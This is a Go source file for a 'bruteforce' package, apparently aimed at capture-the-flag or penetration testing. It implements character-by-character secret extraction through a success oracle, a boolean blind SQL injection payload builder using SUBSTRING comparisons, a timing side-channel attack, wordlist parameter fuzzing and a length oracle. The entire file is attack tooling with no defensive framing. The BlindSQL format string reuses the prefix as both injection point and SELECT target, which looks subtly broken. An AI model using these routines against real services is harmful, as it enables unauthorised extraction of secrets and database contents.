package bruteforce

import (
	"fmt"
	"strings"
	"time"
)

type Bruteforcer struct {
	Charset       string
	MaxLength     int
	Delay         time.Duration
	StopOnSuccess bool
}

func NewBruteforcer() *Bruteforcer {
	return &Bruteforcer{
		Charset:       "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}",
		MaxLength:     50,
		Delay:         0,
		StopOnSuccess: true,
	}
}

type TestFunc func(payload string) (bool, error)

func (b *Bruteforcer) BruteforceCharByChar(prefix, suffix string, testFunc TestFunc) (string, error) {
	result := prefix

	for i := len(prefix); i < b.MaxLength; i++ {
		found := false

		for _, char := range b.Charset {
			if b.Delay > 0 {
				time.Sleep(b.Delay)
			}

			candidate := result + string(char)
			testPayload := candidate + suffix

			success, err := testFunc(testPayload)
			if err != nil {
				return result, err
			}

			if success {
				result = candidate
				found = true
				fmt.Printf("[+] Found: %s\n", result)
				break
			}
		}

		if !found {
			if b.StopOnSuccess {
				break
			}
		}
	}

	return result, nil
}

func (b *Bruteforcer) BlindSQL(prefix string, testFunc TestFunc) (string, error) {
	result := ""
	position := 1

	for position <= b.MaxLength {
		found := false

		for _, char := range b.Charset {
			if b.Delay > 0 {
				time.Sleep(b.Delay)
			}

			payload := fmt.Sprintf("%s AND SUBSTRING((SELECT %s),%d,1)='%c'",
				prefix, prefix, position, char)

			success, err := testFunc(payload)
			if err != nil {
				return result, err
			}

			if success {
				result += string(char)
				found = true
				fmt.Printf("[+] Position %d: %c (Current: %s)\n", position, char, result)
				break
			}
		}

		if !found {
			break
		}
		position++
	}

	return result, nil
}

func (b *Bruteforcer) TimingAttack(basePayload string, testFunc func(string) time.Duration, threshold time.Duration) (string, error) {
	result := ""

	for i := 0; i < b.MaxLength; i++ {
		found := false

		for _, char := range b.Charset {
			if b.Delay > 0 {
				time.Sleep(b.Delay)
			}

			testPayload := basePayload + result + string(char)
			duration := testFunc(testPayload)

			if duration > threshold {
				result += string(char)
				found = true
				fmt.Printf("[+] Timing attack found: %s (took %v)\n", result, duration)
				break
			}
		}

		if !found {
			break
		}
	}

	return result, nil
}

func (b *Bruteforcer) FuzzParameter(basePayload string, wordlist []string, testFunc TestFunc) ([]string, error) {
	var validPayloads []string

	for _, word := range wordlist {
		if b.Delay > 0 {
			time.Sleep(b.Delay)
		}

		payload := strings.Replace(basePayload, "FUZZ", word, -1)
		success, err := testFunc(payload)
		if err != nil {
			continue
		}

		if success {
			validPayloads = append(validPayloads, word)
			fmt.Printf("[+] Valid parameter found: %s\n", word)
		}
	}

	return validPayloads, nil
}

func (b *Bruteforcer) LengthOracle(prefix string, testFunc TestFunc) (int, error) {
	for length := 1; length <= b.MaxLength; length++ {
		testPayload := fmt.Sprintf("%s LENGTH=%d", prefix, length)
		success, err := testFunc(testPayload)
		if err != nil {
			return 0, err
		}

		if success {
			fmt.Printf("[+] Length found: %d\n", length)
			return length, nil
		}
	}

	return 0, fmt.Errorf("length not found within max length")
}

func GenerateCharset(options ...string) string {
	charset := ""
	for _, opt := range options {
		switch opt {
		case "lowercase":
			charset += "abcdefghijklmnopqrstuvwxyz"
		case "uppercase":
			charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		case "digits":
			charset += "0123456789"
		case "special":
			charset += "!@#$%^&*()_+-=[]{}|;:,.<>?"
		case "hex":
			charset += "0123456789abcdef"
		case "alphanumeric":
			charset += "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		default:
			charset += opt
		}
	}
	return charset
}
